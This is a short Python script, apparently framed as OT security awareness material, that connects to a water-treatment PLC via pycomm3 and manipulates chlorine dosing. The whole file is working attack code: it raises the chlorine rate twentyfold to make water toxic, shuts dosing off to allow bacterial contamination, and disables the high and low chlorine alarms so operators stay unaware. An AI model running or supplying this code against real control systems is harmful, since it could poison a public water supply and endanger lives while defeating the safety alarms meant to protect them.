def water_contamination_attack(scada_ip):
    """
    Manipulate chemical dosing system
    Based on real-world threat scenarios
    """
    from pycomm3 import LogixDriver

    with LogixDriver(scada_ip) as plc:
        # Read current chlorine dosing rate
        current_rate = plc.read('Chlorine_Dosing_Rate_GPM')
        print(f"[*] Current chlorine rate: {current_rate.value} GPM")

        # Attack Vector 1: Overdose (too much chlorine)
        overdose_rate = current_rate.value * 20
        plc.write('Chlorine_Dosing_Rate_GPM', overdose_rate)
        print(f"[+] Chlorine rate set to {overdose_rate} GPM (20x normal)")
        print("[!] Result: Toxic chlorine levels in water supply")

        # Attack Vector 2: Underdose (insufficient disinfection)
        plc.write('Chlorine_Dosing_Rate_GPM', 0)
        print("[+] Chlorine dosing disabled")
        print("[!] Result: Bacterial contamination risk")

        # Attack Vector 3: Disable alarms
        plc.write('High_Chlorine_Alarm_Enabled', False)
        plc.write('Low_Chlorine_Alarm_Enabled', False)
        print("[+] Safety alarms disabled")
        print("[!] Operators unaware of dangerous conditions")

# This is why OT security is life-safety critical
